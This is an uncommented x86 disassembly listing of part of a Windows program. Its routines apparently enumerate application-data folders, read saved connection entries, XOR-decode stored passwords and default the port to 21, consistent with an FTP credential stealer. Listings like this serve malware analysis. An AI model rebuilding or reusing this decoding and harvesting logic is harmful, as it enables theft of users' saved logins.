  404869:	e8 22 7a 00 00       	call   0x40c290
  40486e:	83 f8 ff             	cmp    $0xffffffff,%eax
  404871:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404875:	0f 84 e6 01 00 00    	je     0x404a61
  40487b:	68 26 06 00 00       	push   $0x626
  404880:	6a 08                	push   $0x8
  404882:	ff 35 a0 3e 42 00    	push   0x423ea0
  404888:	ff 15 94 e0 40 00    	call   *0x40e094
  40488e:	89 44 24 24          	mov    %eax,0x24(%esp)
  404892:	33 d2                	xor    %edx,%edx
  404894:	33 c0                	xor    %eax,%eax
  404896:	8a 88 4c e5 40 00    	mov    0x40e54c(%eax),%cl
  40489c:	88 4c 04 50          	mov    %cl,0x50(%esp,%eax,1)
  4048a0:	40                   	inc    %eax
  4048a1:	84 c9                	test   %cl,%cl
  4048a3:	75 f1                	jne    0x404896
  4048a5:	33 c0                	xor    %eax,%eax
  4048a7:	8a 88 44 e5 40 00    	mov    0x40e544(%eax),%cl
  4048ad:	88 4c 04 40          	mov    %cl,0x40(%esp,%eax,1)
  4048b1:	40                   	inc    %eax
  4048b2:	84 c9                	test   %cl,%cl
  4048b4:	75 f1                	jne    0x4048a7
  4048b6:	33 c0                	xor    %eax,%eax
  4048b8:	8a 88 3c e5 40 00    	mov    0x40e53c(%eax),%cl
  4048be:	88 4c 04 48          	mov    %cl,0x48(%esp,%eax,1)
  4048c2:	40                   	inc    %eax
  4048c3:	84 c9                	test   %cl,%cl
  4048c5:	75 f1                	jne    0x4048b8
  4048c7:	33 c0                	xor    %eax,%eax
  4048c9:	8a 88 30 e5 40 00    	mov    0x40e530(%eax),%cl
  4048cf:	88 4c 04 5c          	mov    %cl,0x5c(%esp,%eax,1)
  4048d3:	40                   	inc    %eax
  4048d4:	84 c9                	test   %cl,%cl
  4048d6:	75 f1                	jne    0x4048c9
  4048d8:	39 54 24 24          	cmp    %edx,0x24(%esp)
  4048dc:	0f 84 68 01 00 00    	je     0x404a4a
  4048e2:	39 54 24 1c          	cmp    %edx,0x1c(%esp)
  4048e6:	89 54 24 20          	mov    %edx,0x20(%esp)
  4048ea:	0f 86 5a 01 00 00    	jbe    0x404a4a
  4048f0:	8b 1d 2c e1 40 00    	mov    0x40e12c,%ebx
  4048f6:	8b 74 24 20          	mov    0x20(%esp),%esi
  4048fa:	8b 44 24 18          	mov    0x18(%esp),%eax
  4048fe:	c1 e6 02             	shl    $0x2,%esi
  404901:	03 c6                	add    %esi,%eax
  404903:	83 38 00             	cmpl   $0x0,(%eax)
  404906:	0f 84 2c 01 00 00    	je     0x404a38
  40490c:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  404910:	51                   	push   %ecx
  404911:	ff 30                	push   (%eax)
  404913:	ff d3                	call   *%ebx
  404915:	89 44 24 14          	mov    %eax,0x14(%esp)
  404919:	8d 44 24 40          	lea    0x40(%esp),%eax
  40491d:	50                   	push   %eax
  40491e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404922:	ff 34 06             	push   (%esi,%eax,1)
  404925:	ff d3                	call   *%ebx
  404927:	8b f8                	mov    %eax,%edi
  404929:	8d 44 24 48          	lea    0x48(%esp),%eax
  40492d:	50                   	push   %eax
  40492e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404932:	ff 34 06             	push   (%esi,%eax,1)
  404935:	ff d3                	call   *%ebx
  404937:	89 44 24 10          	mov    %eax,0x10(%esp)
  40493b:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  40493f:	50                   	push   %eax
  404940:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404944:	ff 34 06             	push   (%esi,%eax,1)
  404947:	ff d3                	call   *%ebx
  404949:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  40494e:	8b f0                	mov    %eax,%esi
  404950:	0f 84 e2 00 00 00    	je     0x404a38
  404956:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  40495b:	0f 84 d7 00 00 00    	je     0x404a38
  404961:	85 f6                	test   %esi,%esi
  404963:	0f 84 cf 00 00 00    	je     0x404a38
  404969:	83 44 24 14 08       	addl   $0x8,0x14(%esp)
  40496e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404972:	83 44 24 10 06       	addl   $0x6,0x10(%esp)
  404977:	83 c6 0a             	add    $0xa,%esi
  40497a:	e8 25 fe ff ff       	call   0x4047a4
  40497f:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404983:	e8 1c fe ff ff       	call   0x4047a4
  404988:	8b ce                	mov    %esi,%ecx
  40498a:	e8 15 fe ff ff       	call   0x4047a4
  40498f:	85 ff                	test   %edi,%edi
  404991:	74 20                	je     0x4049b3
  404993:	83 c7 06             	add    $0x6,%edi
  404996:	8b cf                	mov    %edi,%ecx
  404998:	e8 07 fe ff ff       	call   0x4047a4
  40499d:	8b c7                	mov    %edi,%eax
  40499f:	e8 61 77 00 00       	call   0x40c105
  4049a4:	8b f8                	mov    %eax,%edi
  4049a6:	83 ff 01             	cmp    $0x1,%edi
  4049a9:	72 08                	jb     0x4049b3
  4049ab:	81 ff ff ff 00 00    	cmp    $0xffff,%edi
  4049b1:	76 03                	jbe    0x4049b6
  4049b3:	6a 15                	push   $0x15
  4049b5:	5f                   	pop    %edi
  4049b6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4049ba:	80 38 00             	cmpb   $0x0,(%eax)
  4049bd:	74 79                	je     0x404a38
  4049bf:	8b 44 24 10          	mov    0x10(%esp),%eax
  4049c3:	80 38 00             	cmpb   $0x0,(%eax)
  4049c6:	74 70                	je     0x404a38
  4049c8:	8a 06                	mov    (%esi),%al
  4049ca:	84 c0                	test   %al,%al
  4049cc:	74 6a                	je     0x404a38
  4049ce:	3c 30                	cmp    $0x30,%al
  4049d0:	74 04                	je     0x4049d6
  4049d2:	3c 31                	cmp    $0x31,%al
  4049d4:	75 06                	jne    0x4049dc
  4049d6:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
  4049da:	74 5c                	je     0x404a38
  4049dc:	33 c0                	xor    %eax,%eax
  4049de:	38 06                	cmp    %al,(%esi)
  4049e0:	74 56                	je     0x404a38
  4049e2:	80 34 30 19          	xorb   $0x19,(%eax,%esi,1)
  4049e6:	40                   	inc    %eax
  4049e7:	80 3c 30 00          	cmpb   $0x0,(%eax,%esi,1)
  4049eb:	75 f5                	jne    0x4049e2
  4049ed:	85 c0                	test   %eax,%eax
  4049ef:	7e 47                	jle    0x404a38
  4049f1:	8d 44 24 68          	lea    0x68(%esp),%eax
  4049f5:	50                   	push   %eax
  4049f6:	ba 18 e9 40 00       	mov    $0x40e918,%edx
  4049fb:	e8 11 0b 00 00       	call   0x405511
  404a00:	59                   	pop    %ecx
  404a01:	57                   	push   %edi
  404a02:	ff 74 24 18          	push   0x18(%esp)
  404a06:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  404a0a:	56                   	push   %esi
  404a0b:	ff 74 24 1c          	push   0x1c(%esp)
  404a0f:	8d 44 24 78          	lea    0x78(%esp),%eax
  404a13:	50                   	push   %eax
  404a14:	ba 11 03 00 00       	mov    $0x311,%edx
  404a19:	e8 db 79 00 00       	call   0x40c3f9
  404a1e:	83 c4 14             	add    $0x14,%esp
  404a21:	85 c0                	test   %eax,%eax
  404a23:	7e 13                	jle    0x404a38
  404a25:	8b 75 10             	mov    0x10(%ebp),%esi
  404a28:	57                   	push   %edi
  404a29:	8b ce                	mov    %esi,%ecx
  404a2b:	e8 db 75 00 00       	call   0x40c00b
  404a30:	84 c0                	test   %al,%al
  404a32:	59                   	pop    %ecx
  404a33:	74 03                	je     0x404a38
  404a35:	ff 46 04             	incl   0x4(%esi)
  404a38:	ff 44 24 20          	incl   0x20(%esp)
  404a3c:	8b 44 24 20          	mov    0x20(%esp),%eax
  404a40:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  404a44:	0f 82 ac fe ff ff    	jb     0x4048f6
  404a4a:	ff 74 24 24          	push   0x24(%esp)
  404a4e:	e8 e7 73 00 00       	call   0x40be3a
  404a53:	8b 44 24 20          	mov    0x20(%esp),%eax
  404a57:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  404a5b:	59                   	pop    %ecx
  404a5c:	e8 f3 73 00 00       	call   0x40be54
  404a61:	33 f6                	xor    %esi,%esi
  404a63:	39 74 24 28          	cmp    %esi,0x28(%esp)
  404a67:	74 10                	je     0x404a79
  404a69:	68 00 80 00 00       	push   $0x8000
  404a6e:	56                   	push   %esi
  404a6f:	ff 74 24 30          	push   0x30(%esp)
  404a73:	ff 15 cc e0 40 00    	call   *0x40e0cc
  404a79:	39 74 24 30          	cmp    %esi,0x30(%esp)
  404a7d:	74 0a                	je     0x404a89
  404a7f:	ff 74 24 30          	push   0x30(%esp)
  404a83:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  404a89:	5f                   	pop    %edi
  404a8a:	5e                   	pop    %esi
  404a8b:	b0 01                	mov    $0x1,%al
  404a8d:	5b                   	pop    %ebx
  404a8e:	8b e5                	mov    %ebp,%esp
  404a90:	5d                   	pop    %ebp
  404a91:	c3                   	ret
  404a92:	55                   	push   %ebp
  404a93:	8b ec                	mov    %esp,%ebp
  404a95:	81 ec 40 02 00 00    	sub    $0x240,%esp
  404a9b:	56                   	push   %esi
  404a9c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404a9f:	57                   	push   %edi
  404aa0:	50                   	push   %eax
  404aa1:	ba 10 e5 40 00       	mov    $0x40e510,%edx
  404aa6:	e8 66 0a 00 00       	call   0x405511
  404aab:	59                   	pop    %ecx
  404aac:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404aaf:	6a 08                	push   $0x8
  404ab1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ab4:	33 f6                	xor    %esi,%esi
  404ab6:	56                   	push   %esi
  404ab7:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404aba:	50                   	push   %eax
  404abb:	c7 45 e8 26 00 00 00 	movl   $0x26,-0x18(%ebp)
  404ac2:	c7 45 ec 1a 00 00 00 	movl   $0x1a,-0x14(%ebp)
  404ac9:	c7 45 f0 23 00 00 00 	movl   $0x23,-0x10(%ebp)
  404ad0:	e8 c8 73 00 00       	call   0x40be9d
  404ad5:	33 ff                	xor    %edi,%edi
  404ad7:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  404add:	50                   	push   %eax
  404ade:	56                   	push   %esi
  404adf:	56                   	push   %esi
  404ae0:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  404ae4:	56                   	push   %esi
  404ae5:	ff 15 14 e1 40 00    	call   *0x40e114
  404aeb:	85 c0                	test   %eax,%eax
  404aed:	75 23                	jne    0x404b12
  404aef:	56                   	push   %esi
  404af0:	56                   	push   %esi
  404af1:	56                   	push   %esi
  404af2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404af5:	50                   	push   %eax
  404af6:	68 cc 47 40 00       	push   $0x4047cc
  404afb:	6a 02                	push   $0x2
  404afd:	6a 01                	push   $0x1
  404aff:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404b02:	50                   	push   %eax
  404b03:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  404b09:	50                   	push   %eax
  404b0a:	e8 39 37 00 00       	call   0x408248
  404b0f:	83 c4 24             	add    $0x24,%esp
  404b12:	47                   	inc    %edi
  404b13:	83 ff 03             	cmp    $0x3,%edi
  404b16:	72 bf                	jb     0x404ad7
  404b18:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  404b1b:	76 0a                	jbe    0x404b27
  404b1d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404b20:	e8 7b e8 ff ff       	call   0x4033a0
  404b25:	eb 09                	jmp    0x404b30
  404b27:	ff 75 f8             	push   -0x8(%ebp)
  404b2a:	e8 0b 73 00 00       	call   0x40be3a
  404b2f:	59                   	pop    %ecx
  404b30:	5f                   	pop    %edi
  404b31:	5e                   	pop    %esi
  404b32:	c9                   	leave
  404b33:	c3                   	ret
  404b34:	55                   	push   %ebp
  404b35:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  404b39:	81 ec ec 01 00 00    	sub    $0x1ec,%esp
  404b3f:	56                   	push   %esi
  404b40:	66 c7 45 84 22 e7    	movw   $0xe722,-0x7c(%ebp)
  404b46:	66 c7 45 86 2f f6    	movw   $0xf62f,-0x7a(%ebp)
  404b4c:	66 c7 45 88 7c b6    	movw   $0xb67c,-0x78(%ebp)
  404b52:	66 c7 45 8a 5a dd    	movw   $0xdd5a,-0x76(%ebp)
  404b58:	66 c7 45 8c db 0f    	movw   $0xfdb,-0x74(%ebp)
  404b5e:	66 c7 45 8e 4e b9    	movw   $0xb94e,-0x72(%ebp)
  404b64:	66 c7 45 90 96 51    	movw   $0x5196,-0x70(%ebp)
  404b6a:	66 c7 45 92 40 e0    	movw   $0xe040,-0x6e(%ebp)
  404b70:	66 c7 45 94 94 f6    	movw   $0xf694,-0x6c(%ebp)
  404b76:	66 c7 45 96 e2 ab    	movw   $0xabe2,-0x6a(%ebp)
  404b7c:	66 c7 45 98 bb 21    	movw   $0x21bb,-0x68(%ebp)
  404b82:	66 c7 45 9a 08 fc    	movw   $0xfc08,-0x66(%ebp)
  404b88:	66 c7 45 9c 8e e4    	movw   $0xe48e,-0x64(%ebp)
  404b8e:	66 c7 45 9e 6a b9    	movw   $0xb96a,-0x62(%ebp)
  404b94:	66 c7 45 a0 d7 55    	movw   $0x55d7,-0x60(%ebp)
  404b9a:	66 c7 45 a2 e5 a6    	movw   $0xa6e5,-0x5e(%ebp)
  404ba0:	66 c7 45 a4 a1 a4    	movw   $0xa4a1,-0x5c(%ebp)
  404ba6:	66 c7 45 a6 72 21    	movw   $0x2172,-0x5a(%ebp)
  404bac:	66 c7 45 a8 2d 82    	movw   $0x822d,-0x58(%ebp)
  404bb2:	66 c7 45 aa ec 29    	movw   $0x29ec,-0x56(%ebp)
  404bb8:	66 c7 45 ac e4 57    	movw   $0x57e4,-0x54(%ebp)
  404bbe:	66 c7 45 ae 58 14    	movw   $0x1458,-0x52(%ebp)
  404bc4:	66 c7 45 b0 d1 04    	movw   $0x4d1,-0x50(%ebp)
  404bca:	66 c7 45 b2 c1 9d    	movw   $0x9dc1,-0x4e(%ebp)
  404bd0:	66 c7 45 b4 20 70    	movw   $0x7020,-0x4c(%ebp)
  404bd6:	66 c7 45 b6 6a fc    	movw   $0xfc6a,-0x4a(%ebp)
  404bdc:	66 c7 45 b8 8f ed    	movw   $0xed8f,-0x48(%ebp)
  404be2:	66 c7 45 ba ba ef    	movw   $0xefba,-0x46(%ebp)
  404be8:	66 c7 45 bc 88 8e    	movw   $0x8e88,-0x44(%ebp)
  404bee:	66 c7 45 be 89 d6    	movw   $0xd689,-0x42(%ebp)
  404bf4:	66 c7 45 c0 8e d1    	movw   $0xd18e,-0x40(%ebp)
  404bfa:	66 c7 45 c2 40 87    	movw   $0x8740,-0x3e(%ebp)
  404c00:	66 c7 45 c4 de a6    	movw   $0xa6de,-0x3c(%ebp)
  404c06:	66 c7 45 c6 01 8e    	movw   $0x8e01,-0x3a(%ebp)
  404c0c:	66 c7 45 c8 c2 3a    	movw   $0x3ac2,-0x38(%ebp)
  404c12:	66 c7 45 ca 71 68    	movw   $0x6871,-0x36(%ebp)
  404c18:	66 c7 45 cc 11 ee    	movw   $0xee11,-0x34(%ebp)
  404c1e:	66 c7 45 ce 2a 8c    	movw   $0x8c2a,-0x32(%ebp)
  404c24:	66 c7 45 d0 c1 5f    	movw   $0x5fc1,-0x30(%ebp)
  404c2a:	66 c7 45 d2 7f 33    	movw   $0x337f,-0x2e(%ebp)
  404c30:	66 c7 45 d4 32 6d    	movw   $0x6d32,-0x2c(%ebp)
  404c36:	66 c7 45 d6 71 d4    	movw   $0xd471,-0x2a(%ebp)
  404c3c:	66 c7 45 d8 c9 7d    	movw   $0x7dc9,-0x28(%ebp)
  404c42:	66 c7 45 da d9 0c    	movw   $0xcd9,-0x26(%ebp)
  404c48:	66 c7 45 dc 71 50    	movw   $0x5071,-0x24(%ebp)
  404c4e:	66 c7 45 de 94 a0    	movw   $0xa094,-0x22(%ebp)
  404c54:	66 c7 45 e0 05 16    	movw   $0x1605,-0x20(%ebp)
  404c5a:	66 c7 45 e2 d7 6f    	movw   $0x6fd7,-0x1e(%ebp)
  404c60:	66 c7 45 e4 38 36    	movw   $0x3638,-0x1c(%ebp)
  404c66:	66 c7 45 e6 fd 4f    	movw   $0x4ffd,-0x1a(%ebp)
  404c6c:	66 c7 45 e8 b2 b3    	movw   $0xb3b2,-0x18(%ebp)
  404c72:	66 c7 45 ea 17 97    	movw   $0x9717,-0x16(%ebp)
  404c78:	66 c7 45 ec ca be    	movw   $0xbeca,-0x14(%ebp)
  404c7e:	66 c7 45 ee 1c 72    	movw   $0x721c,-0x12(%ebp)
  404c84:	66 c7 45 f0 3f 62    	movw   $0x623f,-0x10(%ebp)
  404c8a:	66 c7 45 f2 8f 06    	movw   $0x68f,-0xe(%ebp)
  404c90:	66 c7 45 f4 8f 69    	movw   $0x698f,-0xc(%ebp)
  404c96:	66 c7 45 f6 ff 7f    	movw   $0x7fff,-0xa(%ebp)
  404c9c:	66 c7 45 f8 9c e2    	movw   $0xe29c,-0x8(%ebp)
  404ca2:	66 c7 45 fa e8 27    	movw   $0x27e8,-0x6(%ebp)
  404ca8:	66 c7 45 fc 89 71    	movw   $0x7189,-0x4(%ebp)
  404cae:	66 c7 45 fe 39 49    	movw   $0x4939,-0x2(%ebp)
  404cb4:	66 c7 45 00 4e db    	movw   $0xdb4e,0x0(%ebp)
  404cba:	66 c7 45 02 fd c3    	movw   $0xc3fd,0x2(%ebp)
  404cc0:	66 c7 45 04 8b 8f    	movw   $0x8f8b,0x4(%ebp)
  404cc6:	66 c7 45 06 ee f4    	movw   $0xf4ee,0x6(%ebp)
  404ccc:	66 c7 45 08 95 93    	movw   $0x9395,0x8(%ebp)
  404cd2:	66 c7 45 0a 1a 6b    	movw   $0x6b1a,0xa(%ebp)
  404cd8:	66 c7 45 0c b1 d1    	movw   $0xd1b1,0xc(%ebp)
  404cde:	66 c7 45 0e 6a 0f    	movw   $0xf6a,0xe(%ebp)
  404ce4:	66 c7 45 10 8b 4d    	movw   $0x4d8b,0x10(%ebp)
  404cea:	66 c7 45 12 96 a6    	movw   $0xa696,0x12(%ebp)
  404cf0:	66 c7 45 14 9d a7    	movw   $0xa79d,0x14(%ebp)
  404cf6:	66 c7 45 16 9e bb    	movw   $0xbb9e,0x16(%ebp)
  404cfc:	66 c7 45 18 df 00    	movw   $0xdf,0x18(%ebp)
  404d02:	66 c7 45 1a 3c 09    	movw   $0x93c,0x1a(%ebp)
  404d08:	66 c7 45 1c 6f 85    	movw   $0x856f,0x1c(%ebp)
  404d0e:	66 c7 45 1e 1c b5    	movw   $0xb51c,0x1e(%ebp)
  404d14:	66 c7 45 20 c5 f1    	movw   $0xf1c5,0x20(%ebp)
  404d1a:	66 c7 45 22 3d e8    	movw   $0xe83d,0x22(%ebp)
  404d20:	8b cf                	mov    %edi,%ecx
  404d22:	66 c7 45 24 3a 39    	movw   $0x393a,0x24(%ebp)
  404d28:	66 c7 45 26 d1 03    	movw   $0x3d1,0x26(%ebp)
  404d2e:	66 c7 45 28 d8 68    	movw   $0x68d8,0x28(%ebp)
  404d34:	66 c7 45 2a 59 96    	movw   $0x9659,0x2a(%ebp)
  404d3a:	66 c7 45 2c 91 f7    	movw   $0xf791,0x2c(%ebp)
  404d40:	66 c7 45 2e c2 b2    	movw   $0xb2c2,0x2e(%ebp)
  404d46:	66 c7 45 30 34 02    	movw   $0x234,0x30(%ebp)
  404d4c:	66 c7 45 32 5c 9b    	movw   $0x9b5c,0x32(%ebp)
  404d52:	66 c7 45 34 bf b1    	movw   $0xb1bf,0x34(%ebp)
  404d58:	66 c7 45 36 eb 72    	movw   $0x72eb,0x36(%ebp)
  404d5e:	66 c7 45 38 ba da    	movw   $0xdaba,0x38(%ebp)
  404d64:	66 c7 45 3a c5 f1    	movw   $0xf1c5,0x3a(%ebp)
  404d6a:	66 c7 45 3c 01 da    	movw   $0xda01,0x3c(%ebp)
  404d70:	66 c7 45 3e 47 f0    	movw   $0xf047,0x3e(%ebp)
  404d76:	66 c7 45 40 d8 3d    	movw   $0x3dd8,0x40(%ebp)
  404d7c:	66 c7 45 42 ab 72    	movw   $0x72ab,0x42(%ebp)
  404d82:	66 c7 45 44 4c 78    	movw   $0x784c,0x44(%ebp)
  404d88:	66 c7 45 46 77 00    	movw   $0x77,0x46(%ebp)
  404d8e:	66 c7 45 48 5f b0    	movw   $0xb05f,0x48(%ebp)
  404d94:	66 c7 45 4a 45 a2    	movw   $0xa245,0x4a(%ebp)
  404d9a:	66 c7 45 4c 94 17    	movw   $0x1794,0x4c(%ebp)
  404da0:	66 c7 45 4e d9 16    	movw   $0x16d9,0x4e(%ebp)
  404da6:	66 c7 45 50 c6 c6    	movw   $0xc6c6,0x50(%ebp)
  404dac:	66 c7 45 52 a2 ff    	movw   $0xffa2,0x52(%ebp)
  404db2:	66 c7 45 54 99 f0    	movw   $0xf099,0x54(%ebp)
  404db8:	66 c7 45 56 88 3d    	movw   $0x3d88,0x56(%ebp)
  404dbe:	66 c7 45 58 24 a6    	movw   $0xa624,0x58(%ebp)
  404dc4:	66 c7 45 5a 3d de    	movw   $0xde3d,0x5a(%ebp)
  404dca:	66 c7 45 5c 5b d3    	movw   $0xd35b,0x5c(%ebp)
  404dd0:	66 c7 45 5e b3 82    	movw   $0x82b3,0x5e(%ebp)
  404dd6:	66 c7 45 60 9c 7e    	movw   $0x7e9c,0x60(%ebp)
  404ddc:	66 c7 45 62 06 f4    	movw   $0xf406,0x62(%ebp)
  404de2:	66 c7 45 64 08 16    	movw   $0x1608,0x64(%ebp)
  404de8:	66 c7 45 66 aa 07    	movw   $0x7aa,0x66(%ebp)
  404dee:	66 c7 45 68 7e f9    	movw   $0xf97e,0x68(%ebp)
  404df4:	66 c7 45 6a 3a 37    	movw   $0x373a,0x6a(%ebp)
  404dfa:	66 c7 45 6c 41 c4    	movw   $0xc441,0x6c(%ebp)
  404e00:	66 c7 45 6e b0 15    	movw   $0x15b0,0x6e(%ebp)
  404e06:	66 c7 45 70 99 b6    	movw   $0xb699,0x70(%ebp)
  404e0c:	66 c7 45 72 1c f8    	movw   $0xf81c,0x72(%ebp)
  404e12:	66 c7 45 74 8f e3    	movw   $0xe38f,0x74(%ebp)
  404e18:	66 c7 45 76 97 cb    	movw   $0xcb97,0x76(%ebp)
  404e1e:	e8 41 75 00 00       	call   0x40c364
  404e23:	99                   	cltd
  404e24:	83 e2 03             	and    $0x3,%edx
  404e27:	03 c2                	add    %edx,%eax
  404e29:	8b f0                	mov    %eax,%esi
  404e2b:	c1 fe 02             	sar    $0x2,%esi
  404e2e:	83 fe 7b             	cmp    $0x7b,%esi
  404e31:	73 40                	jae    0x404e73
  404e33:	8d 8d 8c fe ff ff    	lea    -0x174(%ebp),%ecx
  404e39:	8b c7                	mov    %edi,%eax
  404e3b:	e8 f3 73 00 00       	call   0x40c233
  404e40:	84 c0                	test   %al,%al
  404e42:	74 2f                	je     0x404e73
  404e44:	33 c0                	xor    %eax,%eax
  404e46:	85 f6                	test   %esi,%esi
  404e48:	7e 20                	jle    0x404e6a
  404e4a:	33 d2                	xor    %edx,%edx
  404e4c:	8d 8c 45 8d fe ff ff 	lea    -0x173(%ebp,%eax,2),%ecx
  404e53:	8a 71 ff             	mov    -0x1(%ecx),%dh
  404e56:	8a 11                	mov    (%ecx),%dl
  404e58:	66 33 54 45 84       	xor    -0x7c(%ebp,%eax,2),%dx
  404e5d:	66 c1 c2 08          	rol    $0x8,%dx
  404e61:	66 89 14 47          	mov    %dx,(%edi,%eax,2)
  404e65:	40                   	inc    %eax
  404e66:	3b c6                	cmp    %esi,%eax
  404e68:	7c e0                	jl     0x404e4a
  404e6a:	66 83 24 77 00       	andw   $0x0,(%edi,%esi,2)
  404e6f:	8b c6                	mov    %esi,%eax
  404e71:	eb 02                	jmp    0x404e75
  404e73:	33 c0                	xor    %eax,%eax
  404e75:	5e                   	pop    %esi
  404e76:	83 c5 78             	add    $0x78,%ebp
  404e79:	c9                   	leave
  404e7a:	c3                   	ret
  404e7b:	55                   	push   %ebp
  404e7c:	8b ec                	mov    %esp,%ebp
  404e7e:	83 e4 f8             	and    $0xfffffff8,%esp
  404e81:	83 ec 10             	sub    $0x10,%esp
  404e84:	8d 44 24 04          	lea    0x4(%esp),%eax
  404e88:	50                   	push   %eax
  404e89:	ba d0 e6 40 00       	mov    $0x40e6d0,%edx
  404e8e:	e8 7e 06 00 00       	call   0x405511
  404e93:	59                   	pop    %ecx
  404e94:	8d 44 24 04          	lea    0x4(%esp),%eax
  404e98:	89 04 24             	mov    %eax,(%esp)
  404e9b:	33 c0                	xor    %eax,%eax
  404e9d:	50                   	push   %eax
  404e9e:	50                   	push   %eax
  404e9f:	50                   	push   %eax
  404ea0:	ff 75 0c             	push   0xc(%ebp)
  404ea3:	8d 44 24 10          	lea    0x10(%esp),%eax
  404ea7:	68 c0 4e 40 00       	push   $0x404ec0
  404eac:	6a 05                	push   $0x5
  404eae:	6a 01                	push   $0x1
  404eb0:	50                   	push   %eax
  404eb1:	ff 75 08             	push   0x8(%ebp)
  404eb4:	e8 8f 33 00 00       	call   0x408248
  404eb9:	83 c4 24             	add    $0x24,%esp
  404ebc:	8b e5                	mov    %ebp,%esp
  404ebe:	5d                   	pop    %ebp
  404ebf:	c3                   	ret
  404ec0:	55                   	push   %ebp
  404ec1:	8b ec                	mov    %esp,%ebp
  404ec3:	81 ec 98 02 00 00    	sub    $0x298,%esp
  404ec9:	56                   	push   %esi
  404eca:	ff 75 08             	push   0x8(%ebp)
  404ecd:	8b 75 0c             	mov    0xc(%ebp),%esi
  404ed0:	8d 8d 68 fd ff ff    	lea    -0x298(%ebp),%ecx
  404ed6:	8d 46 2c             	lea    0x2c(%esi),%eax
  404ed9:	51                   	push   %ecx
  404eda:	e8 3d 33 00 00       	call   0x40821c
  404edf:	84 c0                	test   %al,%al
  404ee1:	59                   	pop    %ecx
  404ee2:	59                   	pop    %ecx
  404ee3:	0f 84 48 02 00 00    	je     0x405131
  404ee9:	f6 06 10             	testb  $0x10,(%esi)
  404eec:	8d 85 68 fd ff ff    	lea    -0x298(%ebp),%eax
  404ef2:	74 10                	je     0x404f04
  404ef4:	ff 75 10             	push   0x10(%ebp)
  404ef7:	50                   	push   %eax
  404ef8:	e8 7e ff ff ff       	call   0x404e7b
  404efd:	59                   	pop    %ecx
  404efe:	59                   	pop    %ecx
  404eff:	e9 2d 02 00 00       	jmp    0x405131
  404f04:	57                   	push   %edi
  404f05:	50                   	push   %eax
  404f06:	e8 0e 76 00 00       	call   0x40c519
  404f0b:	8b f0                	mov    %eax,%esi
  404f0d:	33 ff                	xor    %edi,%edi
  404f0f:	3b f7                	cmp    %edi,%esi
  404f11:	59                   	pop    %ecx
  404f12:	89 75 d8             	mov    %esi,-0x28(%ebp)
  404f15:	0f 84 15 02 00 00    	je     0x405130
  404f1b:	8b 06                	mov    (%esi),%eax
  404f1d:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  404f20:	51                   	push   %ecx
  404f21:	56                   	push   %esi
  404f22:	ff 90 b4 00 00 00    	call   *0xb4(%eax)
  404f28:	85 c0                	test   %eax,%eax
  404f2a:	0f 85 fa 01 00 00    	jne    0x40512a
  404f30:	8b 45 0c             	mov    0xc(%ebp),%eax
  404f33:	8b 08                	mov    (%eax),%ecx
  404f35:	8d 55 ec             	lea    -0x14(%ebp),%edx
  404f38:	52                   	push   %edx
  404f39:	50                   	push   %eax
  404f3a:	ff 51 1c             	call   *0x1c(%ecx)
  404f3d:	85 c0                	test   %eax,%eax
  404f3f:	0f 85 dc 01 00 00    	jne    0x405121
  404f45:	8d 45 98             	lea    -0x68(%ebp),%eax
  404f48:	50                   	push   %eax
  404f49:	ba f4 e4 40 00       	mov    $0x40e4f4,%edx
  404f4e:	e8 be 05 00 00       	call   0x405511
  404f53:	59                   	pop    %ecx
  404f54:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404f57:	6a 0c                	push   $0xc
  404f59:	58                   	pop    %eax
  404f5a:	8d 55 98             	lea    -0x68(%ebp),%edx
  404f5d:	e8 16 74 00 00       	call   0x40c378
  404f62:	85 c0                	test   %eax,%eax
  404f64:	0f 85 ae 01 00 00    	jne    0x405118
  404f6a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404f6d:	50                   	push   %eax
  404f6e:	ba ac e6 40 00       	mov    $0x40e6ac,%edx
  404f73:	e8 99 05 00 00       	call   0x405511
  404f78:	8b 45 0c             	mov    0xc(%ebp),%eax
  404f7b:	59                   	pop    %ecx
  404f7c:	8b 08                	mov    (%eax),%ecx
  404f7e:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  404f81:	52                   	push   %edx
  404f82:	8d 55 cc             	lea    -0x34(%ebp),%edx
  404f85:	52                   	push   %edx
  404f86:	50                   	push   %eax
  404f87:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  404f8d:	85 c0                	test   %eax,%eax
  404f8f:	75 0d                	jne    0x404f9e
  404f91:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  404f94:	e8 ff 75 00 00       	call   0x40c598
  404f99:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f9c:	eb 03                	jmp    0x404fa1
  404f9e:	89 7d f8             	mov    %edi,-0x8(%ebp)
  404fa1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404fa4:	50                   	push   %eax
  404fa5:	ba a0 e6 40 00       	mov    $0x40e6a0,%edx
